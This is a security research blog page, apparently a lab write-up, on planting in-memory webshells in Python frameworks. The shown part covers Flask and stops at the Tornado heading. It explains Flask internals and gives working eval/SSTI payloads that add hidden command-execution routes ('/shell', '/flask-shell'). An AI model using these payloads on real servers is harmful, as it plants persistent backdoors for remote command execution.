<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>Python Web 内存马多框架植入技术详解 | 天工实验室</title>
<meta name="keywords" content="Python, Web, 内存马">
<meta name="description" content="Python Web 内存马多框架植入技术详解 一、前言 内存马作为一种常见的攻击与权限维持手段，往往多见于Java Web应用中，然而在Python Web场景下却并不多见这种攻击。
本文将针对Flask、Tornado与Django三个在日常开发中使用频率较高的框架，探寻在Python Web场景下的内存马种植方法，文中所有场景均为抽象出的理想场景，仅做可行性讨论。
二、Flask 2.1 老版本Flask内存马种植方法 在网上针对Flask内存马的探讨，均在SSTI场景下，并且payload都相同，格式化后payload如下：
url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]( &#34;app.add_url_rule( &#39;/shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read() )&#34;, { &#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;], &#39;app&#39;:url_for.__globals__[&#39;current_app&#39;] } ) 在Flask中所有定义的路由都会使用一个装饰器 app.route，而这个装饰器就是调用了 add_url_rule。
@setupmethod def route(self, rule: str, **options: t.Any) -&gt; t.Callable[[T_route], T_route]: def decorator(f: T_route) -&gt; T_route: endpoint = options.pop(&#34;endpoint&#34;, None) self.add_url_rule(rule, endpoint, f, **options) return f return decorator 所以在payload中，直接调用了Flask中的 add_url_rule 函数来动态增加一条路由实现内存马。然而在最新版本的Flask中，如果直接使用这个payload会发现将抛出一个异常。
2.2 AssertionError出现原因 在回溯这个异常的时候会发现，这个异常出现在 setupmethod 这个装饰器中的一个校验函数。
def _check_setup_finished(self, f_name: str) -&gt; None: if self.">
<meta name="author" content="4uuu Nya">
<link rel="canonical" href="http://localhost:1313/blog/tiangongarticle038/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.9b0c42f9222bc665b5845e6199fc07fd87b025125d3366cc5f873b0f54ca8481.css" integrity="sha256-mwxC&#43;SIrxmW1hF5hmfwH/YewJRJdM2bMX4c7D1TKhIE=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="http://localhost:1313/blog/tiangongarticle038/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="天工实验室 (Alt + H)">
                <img src="http://localhost:1313/logo/logo3.png" alt="" aria-label="logo"
                    height="100" style="margin-top: 15px;">
            </a>
            <div class="logo-switches">
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/archives" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="标签">
                    <span>标签</span>
                </a>
            </li>
            <li>
                <a href="https://poc.qianxin.com/home" title="破壳官网">
                    <span>破壳官网</span>&nbsp;
                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
                        <path d="M15 3h6v6"></path>
                        <path d="M10 14L21 3"></path>
                    </svg>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">主页</a>&nbsp;»&nbsp;<a href="http://localhost:1313/blog/">博客</a></div>
    <h1 class="post-title entry-hint-parent">
      Python Web 内存马多框架植入技术详解
    </h1>
    <div class="post-meta"><span title='2024-07-10 00:00:00 +0000 UTC'>2024年07月10日</span>&nbsp;·&nbsp;5 分钟&nbsp;·&nbsp;4uuu Nya

</div>
  </header>

  <div class="author">
    <div class="author_avatar">
      <img src="/authors/4uuu.png" alt="4uuu Nya">
    </div>
    <div class="author_info">
      <span class="author_id">4uuu Nya</span>
      <p class="author_description">天工实验室安全研究员，Nu1L Team，Web安全与代码审计</p>
    </div>
  </div>
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/python/">Python</a></li>
      <li><a href="http://localhost:1313/tags/web/">Web</a></li>
      <li><a href="http://localhost:1313/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a></li>
    </ul><br/> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">目录</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#python-web-%e5%86%85%e5%ad%98%e9%a9%ac%e5%a4%9a%e6%a1%86%e6%9e%b6%e6%a4%8d%e5%85%a5%e6%8a%80%e6%9c%af%e8%af%a6%e8%a7%a3" aria-label="Python Web 内存马多框架植入技术详解">Python Web 内存马多框架植入技术详解</a><ul>
                        
                <li>
                    <a href="#%e4%b8%80%e5%89%8d%e8%a8%80" aria-label="一、前言">一、前言</a></li>
                <li>
                    <a href="#%e4%ba%8cflask" aria-label="二、Flask">二、Flask</a><ul>
                        
                <li>
                    <a href="#21-%e8%80%81%e7%89%88%e6%9c%acflask%e5%86%85%e5%ad%98%e9%a9%ac%e7%a7%8d%e6%a4%8d%e6%96%b9%e6%b3%95" aria-label="2.1 老版本Flask内存马种植方法">2.1 老版本Flask内存马种植方法</a></li>
                <li>
                    <a href="#22-assertionerror%e5%87%ba%e7%8e%b0%e5%8e%9f%e5%9b%a0" aria-label="2.2 AssertionError出现原因">2.2 AssertionError出现原因</a></li>
                <li>
                    <a href="#23-add_url_rule%e5%ae%9e%e7%8e%b0" aria-label="2.3 add_url_rule实现">2.3 add_url_rule实现</a></li>
                <li>
                    <a href="#24-%e7%a7%8d%e6%a4%8d%e6%96%b9%e6%b3%95" aria-label="2.4 种植方法">2.4 种植方法</a></li>
                <li>
                    <a href="#25-%e7%bb%93%e6%9e%9c" aria-label="2.5 结果">2.5 结果</a></li></ul>
                </li>
                <li>
                    <a href="#%e4%b8%89tornado" aria-label="三、Tornado">三、Tornado</a><ul>
                        
                <li>
                    <a href="#31-%e5%9c%ba%e6%99%af%e4%bb%a3%e7%a0%81" aria-label="3.1 场景代码">3.1 场景代码</a></li>
                <li>
                    <a href="#32-%e7%a7%8d%e6%a4%8d%e6%96%b9%e6%b3%95" aria-label="3.2 种植方法">3.2 种植方法</a></li>
                <li>
                    <a href="#33-%e5%8f%82%e6%95%b0%e6%9e%84%e9%80%a0" aria-label="3.3 参数构造">3.3 参数构造</a></li>
                <li>
                    <a href="#34-%e7%bb%93%e6%9e%9c" aria-label="3.4 结果">3.4 结果</a></li></ul>
                </li>
                <li>
                    <a href="#%e5%9b%9bdjango" aria-label="四、Django">四、Django</a><ul>
                        
                <li>
                    <a href="#41-%e5%9c%ba%e6%99%af%e4%bb%a3%e7%a0%81" aria-label="4.1 场景代码">4.1 场景代码</a></li>
                <li>
                    <a href="#42-%e8%8e%b7%e5%8f%96appurlpatterns" aria-label="4.2 获取app.urlpatterns">4.2 获取app.urlpatterns</a></li>
                <li>
                    <a href="#43-djangourlspath" aria-label="4.3 django.urls.path">4.3 django.urls.path</a></li>
                <li>
                    <a href="#44-%e8%af%b7%e6%b1%82%e6%9e%84%e9%80%a0" aria-label="4.4 请求构造">4.4 请求构造</a></li>
                <li>
                    <a href="#45-%e7%bb%93%e6%9e%9c" aria-label="4.5 结果">4.5 结果</a></li></ul>
                </li>
                <li>
                    <a href="#%e4%ba%94%e6%80%bb%e7%bb%93" aria-label="五、总结">五、总结</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="python-web-内存马多框架植入技术详解">Python Web 内存马多框架植入技术详解<a hidden class="anchor" aria-hidden="true" href="#python-web-内存马多框架植入技术详解">#</a></h1>
<h2 id="一前言">一、前言<a hidden class="anchor" aria-hidden="true" href="#一前言">#</a></h2>
<p>内存马作为一种常见的攻击与权限维持手段，往往多见于Java Web应用中，然而在Python Web场景下却并不多见这种攻击。</p>
<p>本文将针对Flask、Tornado与Django三个在日常开发中使用频率较高的框架，探寻在Python Web场景下的内存马种植方法，文中所有场景均为抽象出的理想场景，仅做可行性讨论。</p>
<!-- raw HTML omitted -->
<h2 id="二flask">二、Flask<a hidden class="anchor" aria-hidden="true" href="#二flask">#</a></h2>
<h3 id="21-老版本flask内存马种植方法">2.1 老版本Flask内存马种植方法<a hidden class="anchor" aria-hidden="true" href="#21-老版本flask内存马种植方法">#</a></h3>
<p>在网上针对Flask内存马的探讨，均在SSTI场景下，并且payload都相同，格式化后payload如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>url_for<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;__builtins__&#39;</span>][<span style="color:#e6db74">&#39;eval&#39;</span>](
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;app.add_url_rule(</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;/shell&#39;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;shell&#39;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">lambda</span> :__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(_request_ctx_stack<span style="color:#f92672">.</span>top<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;cmd&#39;</span>, <span style="color:#e6db74">&#39;whoami&#39;</span>))<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>    )<span style="color:#e6db74">&#34;,</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;_request_ctx_stack&#39;</span>:url_for<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;_request_ctx_stack&#39;</span>],
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;app&#39;</span>:url_for<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;current_app&#39;</span>]
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>)
</span></span></code></pre></div><p>在Flask中所有定义的路由都会使用一个装饰器 <code>app.route</code>，而这个装饰器就是调用了 <code>add_url_rule</code>。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@setupmethod</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">route</span>(self, rule: str, <span style="color:#f92672">**</span>options: t<span style="color:#f92672">.</span>Any) <span style="color:#f92672">-&gt;</span> t<span style="color:#f92672">.</span>Callable[[T_route], T_route]:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decorator</span>(f: T_route) <span style="color:#f92672">-&gt;</span> T_route:
</span></span><span style="display:flex;"><span>        endpoint <span style="color:#f92672">=</span> options<span style="color:#f92672">.</span>pop(<span style="color:#e6db74">&#34;endpoint&#34;</span>, <span style="color:#66d9ef">None</span>)
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>add_url_rule(rule, endpoint, f, <span style="color:#f92672">**</span>options)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> f
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> decorator
</span></span></code></pre></div><p>所以在payload中，直接调用了Flask中的 <code>add_url_rule</code> 函数来动态增加一条路由实现内存马。然而在最新版本的Flask中，如果直接使用这个payload会发现将抛出一个异常。</p>
<p><img loading="lazy" src="/attachments/2024-07-10-python-web/ef0eb9eb-e2b5-4d4d-bc80-02e4426972d5.png" alt=""  />
</p>
<h3 id="22-assertionerror出现原因">2.2 AssertionError出现原因<a hidden class="anchor" aria-hidden="true" href="#22-assertionerror出现原因">#</a></h3>
<p>在回溯这个异常的时候会发现，这个异常出现在 <code>setupmethod</code> 这个装饰器中的一个校验函数。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_check_setup_finished</span>(self, f_name: str) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>_got_first_request:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">AssertionError</span>(
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;The setup method &#39;</span><span style="color:#e6db74">{</span>f_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; can no longer be called&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34; on the application. It has already handled its first&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34; request, any changes will not be applied&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34; consistently.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Make sure all imports, decorators, functions, etc.&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34; needed to set up the application are done before&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34; running it.&#34;</span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">setupmethod</span>(f: F) <span style="color:#f92672">-&gt;</span> F:
</span></span><span style="display:flex;"><span>    f_name <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>__name__
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">wrapper_func</span>(self: Scaffold, <span style="color:#f92672">*</span>args: t<span style="color:#f92672">.</span>Any, <span style="color:#f92672">**</span>kwargs: t<span style="color:#f92672">.</span>Any) <span style="color:#f92672">-&gt;</span> t<span style="color:#f92672">.</span>Any:
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_check_setup_finished(f_name)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> f(self, <span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> t<span style="color:#f92672">.</span>cast(F, update_wrapper(wrapper_func, f))
</span></span></code></pre></div><p>跟踪一下 <code>_got_first_request</code> 会发现在 <code>full_dispatch_request</code> 中会强制赋值成 <code>True</code>。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">full_dispatch_request</span>(self) <span style="color:#f92672">-&gt;</span> Response:
</span></span><span style="display:flex;"><span>    self<span style="color:#f92672">.</span>_got_first_request <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        request_started<span style="color:#f92672">.</span>send(self, _async_wrapper<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>ensure_sync)
</span></span><span style="display:flex;"><span>        rv <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>preprocess_request()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> rv <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>            rv <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>dispatch_request()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        rv <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>handle_user_exception(e)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>finalize_request(rv)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">wsgi_app</span>(self, environ: WSGIEnvironment, start_response: StartResponse) <span style="color:#f92672">-&gt;</span> cabc<span style="color:#f92672">.</span>Iterable[bytes]:
</span></span><span style="display:flex;"><span>    ctx <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>request_context(environ)
</span></span><span style="display:flex;"><span>    error: <span style="color:#a6e22e">BaseException</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            ctx<span style="color:#f92672">.</span>push()
</span></span><span style="display:flex;"><span>            response <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>full_dispatch_request()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># ...</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> __call__(self, environ: WSGIEnvironment, start_response: StartResponse) <span style="color:#f92672">-&gt;</span> cabc<span style="color:#f92672">.</span>Iterable[bytes]:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>wsgi_app(environ, start_response)
</span></span></code></pre></div><p>这样一来就会导致在任何请求中，都无法再调用到使用了 <code>setupmethod</code> 装饰器的函数。</p>
<h3 id="23-add_url_rule实现">2.3 add_url_rule实现<a hidden class="anchor" aria-hidden="true" href="#23-add_url_rule实现">#</a></h3>
<p>既然无法绕过这个校验，那么回头重新看一下 <code>add_url_rule</code> 中的实现。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@setupmethod</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_url_rule</span>(
</span></span><span style="display:flex;"><span>    self,
</span></span><span style="display:flex;"><span>    rule: str,
</span></span><span style="display:flex;"><span>    endpoint: str <span style="color:#f92672">|</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>,
</span></span><span style="display:flex;"><span>    view_func: ft<span style="color:#f92672">.</span>RouteCallable <span style="color:#f92672">|</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>,
</span></span><span style="display:flex;"><span>    provide_automatic_options: bool <span style="color:#f92672">|</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">**</span>options: t<span style="color:#f92672">.</span>Any,
</span></span><span style="display:flex;"><span>) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> endpoint <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>        endpoint <span style="color:#f92672">=</span> _endpoint_from_view_func(view_func)  <span style="color:#75715e"># type: ignore</span>
</span></span><span style="display:flex;"><span>    options[<span style="color:#e6db74">&#34;endpoint&#34;</span>] <span style="color:#f92672">=</span> endpoint
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ... </span>
</span></span><span style="display:flex;"><span>    rule_obj <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>url_rule_class(rule, methods<span style="color:#f92672">=</span>methods, <span style="color:#f92672">**</span>options)
</span></span><span style="display:flex;"><span>    rule_obj<span style="color:#f92672">.</span>provide_automatic_options <span style="color:#f92672">=</span> provide_automatic_options
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    self<span style="color:#f92672">.</span>url_map<span style="color:#f92672">.</span>add(rule_obj)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> view_func <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>        old_func <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>view_functions<span style="color:#f92672">.</span>get(endpoint)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> old_func <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">and</span> old_func <span style="color:#f92672">!=</span> view_func:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">AssertionError</span>(
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;View function mapping is overwriting an existing&#34;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34; endpoint function: </span><span style="color:#e6db74">{</span>endpoint<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>            )
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>view_functions[endpoint] <span style="color:#f92672">=</span> view_func
</span></span></code></pre></div><p>省略掉开头的处理代码，会发现在函数末尾的处理中，将 <code>rule_obj</code> 对象添加到了 <code>url_map</code> 中，之后将 <code>view_func</code> 作为了 <code>view_functions</code> 字典中 <code>endpoint</code> 键的值，所以理论上来讲，可以通过直接操作这两个变量来完成一次手动的 <code>add_url_rule</code>。</p>
<p><code>url_map</code> 和 <code>view_functions</code> 的定义如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>url_map_class <span style="color:#f92672">=</span> Map
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>self<span style="color:#f92672">.</span>view_functions: dict[str, ft<span style="color:#f92672">.</span>RouteCallable] <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span>self<span style="color:#f92672">.</span>url_map <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>url_map_class(host_matching<span style="color:#f92672">=</span>host_matching)
</span></span></code></pre></div><h3 id="24-种植方法">2.4 种植方法<a hidden class="anchor" aria-hidden="true" href="#24-种植方法">#</a></h3>
<p>一个任意代码执行的理想场景如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calc</span>():
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> eval(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;expression&#39;</span>))
</span></span><span style="display:flex;"><span>    template <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;h2&gt;result: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">!&lt;/h2&gt;&#39;</span> <span style="color:#f92672">%</span> result
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> template
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(debug<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span></code></pre></div><p>在 <code>eval</code> 场景下，没有办法执行多条代码，所以这里需要发送两条请求来完成操作，当前上下文中可以直接使用 <code>app</code> 对象，构造第一条请求向 <code>url_map</code> 中新增一条 <code>UrlRule</code>。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>app<span style="color:#f92672">.</span>url_map<span style="color:#f92672">.</span>add(app<span style="color:#f92672">.</span>url_rule_class(<span style="color:#e6db74">&#39;/flask-shell&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>],endpoint<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;shell&#39;</span>))
</span></span></code></pre></div><p>这个时候已经可以访问 <code>/flask-shell</code> 路由，但是由于 <code>view_functions</code> 中并不存在路由指定的 <code>endpoint</code> 所以会报错。</p>
<p><img loading="lazy" src="/attachments/2024-07-10-python-web/c7403c53-65c6-44b4-a823-13facc30c0e4.png" alt=""  />
</p>
<p>之后再构造第二条请求，向 <code>view_functions</code> 中增加对应 <code>endpoint</code> 的实现。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>app<span style="color:#f92672">.</span>view_functions<span style="color:#f92672">.</span>update({<span style="color:#e6db74">&#39;shell&#39;</span>: <span style="color:#66d9ef">lambda</span>:__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(request_context<span style="color:#f92672">.</span>top<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;cmd&#39;</span>, <span style="color:#e6db74">&#39;whoami&#39;</span>))<span style="color:#f92672">.</span>read()})
</span></span></code></pre></div><p>为了灵活性这里需要http传参来控制执行的命令，但是这里会发现上下文中并不存在 <code>request_context</code>，当前 <code>app</code> 对象中的 <code>request_context</code> 是一个函数。</p>
<p><img loading="lazy" src="/attachments/2024-07-10-python-web/9104cbf3-111d-4eb0-a157-9ae9922cf1da.png" alt=""  />
</p>
<p>那么可以通过函数的 <code>__globals__</code> 属性来获取当前的全局变量字典，在这其中就有需要的 <code>RequestContext</code> 对象。</p>
<p><img loading="lazy" src="/attachments/2024-07-10-python-web/c22c30c5-9669-48b1-9e01-6ce01e3c9d91.png" alt=""  />
</p>
<p>所以修改一下第二条payload如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>app<span style="color:#f92672">.</span>view_functions<span style="color:#f92672">.</span>update({<span style="color:#e6db74">&#39;shell&#39;</span>: <span style="color:#66d9ef">lambda</span>:__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(app<span style="color:#f92672">.</span>request_context<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;request_ctx&#39;</span>]<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;cmd&#39;</span>, <span style="color:#e6db74">&#39;whoami&#39;</span>))<span style="color:#f92672">.</span>read()})
</span></span></code></pre></div><h3 id="25-结果">2.5 结果<a hidden class="anchor" aria-hidden="true" href="#25-结果">#</a></h3>
<p>将两条payload发送完成后，即可新增一条任意命令执行的路由 <code>/flask-shell</code>。</p>
<p><img loading="lazy" src="/attachments/2024-07-10-python-web/0977c008-c2d5-4d00-9e13-c5271d1ccae2.png" alt=""  />
</p>
<h2 id="三tornado">三、Tornado<a hidden class="anchor" aria-hidden="true" href="#三tornado">#</a></h2>
<h3 id="31-场景代码">3.1 场景代码<a hidden class="anchor" aria-hidden="true" href="#31-场景代码">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> tornado
</span></span><span style="display:flex;"><span>
